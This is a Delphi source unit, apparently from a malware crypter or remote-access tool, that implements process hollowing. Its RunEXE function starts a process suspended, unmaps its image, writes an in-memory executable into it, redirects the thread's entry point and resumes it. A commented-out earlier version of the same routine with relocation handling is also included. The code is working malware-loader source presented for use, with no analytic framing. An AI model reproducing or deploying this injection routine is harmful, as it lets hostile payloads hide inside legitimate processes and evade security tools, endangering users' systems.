Unit UnitInjectServer;

interface

uses
  windows;

//function RunEXE(bFile: pointer; ProcFileName: pWideChar; var ProcID: cardinal): boolean;
function RunEXE(bFile: pointer; ProcFileName: pWideChar; var ProcID: cardinal; TempPI: pProcessInformation = nil): boolean;
function FileToPointer(FileName: pWideChar): Pointer;

implementation

function FileToPointer(FileName: pWideChar): Pointer;
var
  hFile: Cardinal;
  Size: int64;
  lpNumberOfBytesRead: DWORD;
begin
  hFile := CreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ, nil, OPEN_EXISTING, 0, 0);
  if hFile <> INVALID_HANDLE_VALUE then
  begin
    Size := GetFileSize(hFile, nil);
    Result := VirtualAlloc(nil, Size, MEM_COMMIT, PAGE_READWRITE);
    ReadFile(hFile, Result^, Size, lpNumberOfBytesRead, nil);
  end;
  CloseHandle(hFile);
end;
(*
type
  PImageBaseRelocation = ^TImageBaseRelocation;
  TImageBaseRelocation = packed record
    VirtualAddress: DWORD;
    SizeOfBlock: DWORD;
  end;

function DoSize(pImage: Pointer): Pointer;
var
  IDH: PImageDosHeader;
  INH: PImageNtHeaders;
  ISH: PImageSectionHeader;
  i: WORD;
begin
  IDH := pImage;
  INH := Pointer(Integer(pImage) + IDH^._lfanew);
  Result := VirtualAlloc(nil, INH^.OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);
  ZeroMemory(Result, INH^.OptionalHeader.SizeOfImage);
  CopyMemory(Result, pImage, INH^.OptionalHeader.SizeOfHeaders);
  for i := 0 to INH^.FileHeader.NumberOfSections - 1 do
  begin
    ISH := Pointer(Integer(pImage) + IDH^._lfanew + 248 + i * 40);
    CopyMemory(Pointer(DWORD(Result) + ISH^.VirtualAddress), Pointer(DWORD(pImage) + ISH^.PointerToRawData), ISH^.SizeOfRawData);
  end;
end;

function DoBase(var Base: PContext): PContext;
begin
  Base := VirtualAlloc(nil, SizeOf(TContext) + 4, MEM_COMMIT, PAGE_READWRITE);
  Result := Base;
  if Base <> nil then
    while ((DWORD(Result) mod 4) <> 0) do
      Result := Pointer(DWORD(Result) + 1);
end;

function RunEXE(bFile: Pointer; ProcFileName: pWideChar; var ProcID: cardinal): boolean;
var
  PI: TProcessInformation;
  SI: TStartupInfo;
  CT: PContext;
  CTBase: PContext;
  IDH: PImageDosHeader;
  INH: PImageNtHeaders;
  dwImageBase: DWORD;
  pModule: Pointer;
  dwNull: DWORD;
  I: Cardinal;
  pRelocation: PImageBaseRelocation;
  pDest: Pointer;
  pwRelInfo: PWORD;
  pdwPatchAddrHL: PDWORD;
  iType: Integer;
  iOffset: Integer;
begin
  ProcID := 0;
  Result := False;
  IDH := bFile;
  if IDH^.e_magic = IMAGE_DOS_SIGNATURE then
  begin
    INH := Pointer(Integer(bFile) + IDH^._lfanew);
    if INH^.Signature = IMAGE_NT_SIGNATURE then
    begin
      ZeroMemory(@SI, SizeOf(TStartupInfo));
      ZeroMemory(@PI, SizeOf(TProcessInformation));
      SI.cb := SizeOf(TStartupInfo);
      if CreateProcessW(nil, ProcFileName, nil, nil, False, CREATE_SUSPENDED, nil, nil, SI, PI) then
      begin
        CT := DoBase(CTBase);
        if CT <> nil then
        begin
          CT^.ContextFlags := CONTEXT_FULL;
          if GetThreadContext(PI.hThread, CT^) then
          begin
            ReadProcessMemory(PI.hProcess, Pointer(CT^.Ebx + 8), @dwImageBase, 4, dwNull);
            if dwImageBase = INH^.OptionalHeader.ImageBase then
            begin
              pModule := VirtualAllocEx(PI.hProcess, nil, INH^.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            end
            else
            begin
              pModule := VirtualAllocEx(PI.hProcess, Pointer(INH^.OptionalHeader.ImageBase), INH^.OptionalHeader.SizeOfImage, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            end;
            if pModule <> nil then
            begin
              bFile := DoSize(bFile);
              if DWORD(pModule) <> INH^.OptionalHeader.ImageBase then
              begin
                if INH^.OptionalHeader.DataDirectory[5].Size > 0 then
                begin
                  pRelocation := PImageBaseRelocation(Cardinal(bFile) + INH^.OptionalHeader.DataDirectory[5].VirtualAddress);
                  while pRelocation.VirtualAddress > 0 do
                  begin
                    pDest := Pointer((Cardinal(bFile) + pRelocation.VirtualAddress));
                    pwRelInfo := Pointer(Cardinal(pRelocation) + 8);
                    for I := 0 to (Trunc(((pRelocation.SizeOfBlock - 8) / 2)) - 1) do
                    begin
                      iType := (pwRelInfo^ shr 12);
                      iOffset := pwRelInfo^ and $FFF;
                      if iType = 3 then
                      begin
                        pdwPatchAddrHL := Pointer(Cardinal(pDest) + Cardinal(iOffset));
                        pdwPatchAddrHL^ := pdwPatchAddrHL^ + (DWORD(pModule) - INH^.OptionalHeader.ImageBase);
                      end;
                      inc(pwRelInfo);
                    end;
                    pRelocation := Pointer(cardinal(pRelocation) + pRelocation.SizeOfBlock);
                  end;
                end;
                INH^.OptionalHeader.ImageBase := DWORD(pModule);
                CopyMemory(Pointer(Integer(bFile) + IDH^._lfanew), INH, 248);
              end;
              WriteProcessMemory(PI.hProcess, pModule, bFile, INH.OptionalHeader.SizeOfImage, dwNull);
              WriteProcessMemory(PI.hProcess, Pointer(CT.Ebx + 8), @pModule, 4, dwNull);
              CT^.Eax := DWORD(pModule) + INH^.OptionalHeader.AddressOfEntryPoint;
              SetThreadContext(PI.hThread, CT^);
              ResumeThread(PI.hThread);
              VirtualFree(bFile, 0, MEM_RELEASE);
              Result := PI.hThread > 0;
            end;
          end;
          VirtualFree(CTBase, 0, MEM_RELEASE);
        end;
        if Result = False then TerminateProcess(PI.hProcess, 0);
        ProcID := PI.hProcess;
      end;
    end;
  end;
end;
*)

procedure MyCopyMemory(Destination: Pointer; Source: Pointer; Length: LongWord);
begin
  Move(Source^, Destination^, Length);
end;

procedure Move(Destination, Source: Pointer; dLength:Cardinal);
begin
  MyCopyMemory(Destination, Source, dLength);
end;

function NtUnmapViewOfSection(ProcessHandle: THandle;
  BaseAddress: Pointer): DWORD; stdcall; external 'ntdll.dll' name 'NtUnmapViewOfSection';

function RunEXE(bFile: pointer; ProcFileName: pWideChar; var ProcID: cardinal; TempPI: pProcessInformation = nil): boolean;
var
  IDH:        TImageDosHeader;
  INH:        TImageNtHeaders;
  ISH:        TImageSectionHeader;
  PI:         TProcessInformation;
  SI:         TStartUpInfo;
  CONT:       TContext;
  ImageBase:  Pointer;
  Ret:        ULONG_PTR;
  i:          integer;
  Addr:       DWORD;
  dOffset:    DWORD;
  Size: int64;
  b: Boolean;
begin
  ProcID := 0;
  result := false;
  try
    FillChar(SI, SizeOf(TStartupInfo),0);
    FillChar(PI, SizeOf(TProcessInformation),0);
    FillChar(CONT, SizeOf(TContext), 0);
    SI.cb := SizeOf(TStartupInfo);
    CONT.ContextFlags := CONTEXT_FULL;
    Move(@IDH, pointer(integer(bFile)), 64);
    Move(@INH, pointer(integer(bFile) + IDH._lfanew), 248);

    b := False;
    if TempPI <> nil then
    begin
      CopyMemory(@PI, TempPI, SizeOf(PI));
      b := True;
    end else b := CreateProcessW(nil, ProcFileName, nil, nil, FALSE, $00000004, nil, nil, SI, PI);

    if b = True then
    begin
      ProcID := PI.hProcess;
      sleep(200);
      GetThreadContext(PI.hThread, CONT);
      ReadProcessMemory(PI.hProcess, Ptr(CONT.Ebx + 8), @Addr, 4, Ret);
      NtUnmapViewOfSection(PI.hProcess, @Addr);
      ImageBase := VirtualAllocEx(PI.hProcess, Ptr(INH.OptionalHeader.ImageBase), INH.OptionalHeader.SizeOfImage, $2000 or $1000, 4);
      WriteProcessMemory(PI.hProcess, ImageBase, pointer(integer(bFile)), INH.OptionalHeader.SizeOfHeaders, Ret);
      dOffset := IDH._lfanew + 248;
      for i := 0 to INH.FileHeader.NumberOfSections - 1 do
      begin
        Move(@ISH, pointer(integer(bFile) + dOffset + (i * 40)), 40);
        WriteProcessMemory(PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress), pointer(integer(bFile) + ISH.PointerToRawData), ISH.SizeOfRawData, Ret);
        VirtualProtectEx(PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress), ISH.Misc.VirtualSize, $40, @Addr);
      end;
      Result := WriteProcessMemory(PI.hProcess, Ptr(CONT.Ebx + 8), @ImageBase, 4, Ret);
      CONT.Eax := Cardinal(ImageBase) + INH.OptionalHeader.AddressOfEntryPoint;
      if Result = true then
      begin
        Result := SetThreadContext(PI.hThread, CONT);
        ResumeThread(PI.hThread);
      end;
    end;
    except
    CloseHandle(PI.hProcess);
    CloseHandle(PI.hThread);
    Result := false;
  end;
end;

end.
